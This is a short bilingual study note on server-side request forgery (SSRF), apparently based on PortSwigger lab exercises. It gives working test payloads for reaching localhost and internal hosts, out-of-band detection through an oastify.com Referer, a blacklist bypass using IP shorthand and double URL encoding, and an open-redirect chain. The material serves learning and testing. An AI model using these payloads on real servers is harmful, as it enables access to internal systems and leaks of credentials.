Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.

In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems. This could leak sensitive data, such as authorization credentials.

## 1. Principle

控制目标某个接口, 可以目标的身份发送数据

### 1.1. Location

一般是请求包中出现 URL 的位置

## 2. Test

### 2.1. Against the Local Server

SSRF 访问内部内部接口

```
stockApi=http%3a%2f%2flocalhost%2f
```

### 2.2. Against Another Back-End System

SSRF 探测内网

```
stockApi=http%3a%2f%2f192.168.0.foo%3a8080%2f
```

### 2.3. OOB Detection

HTTP 请求头中的 Referer 存在 SSRF 可通过 OOB 检测

```
Referer: https://oastify.com/
```

### 2.4. Blacklist-Based Input Filter

使用 IP 简写和 URL 双写绕过黑名单

```
stockApi=http%3a%2f%2f127.1%2f%2561dmin
```

### 2.5. Open Redirection

通过开放重定向造成 SSRF

```
/product/nextProduct?path=http://192.168.0.12:8080/admin
```

---

**References**

- [SSRF](https://portswigger.net/web-security/ssrf)
- [CWE-918](https://hackerone.com/hacktivity/cwe_discovery?id=cwe-918)
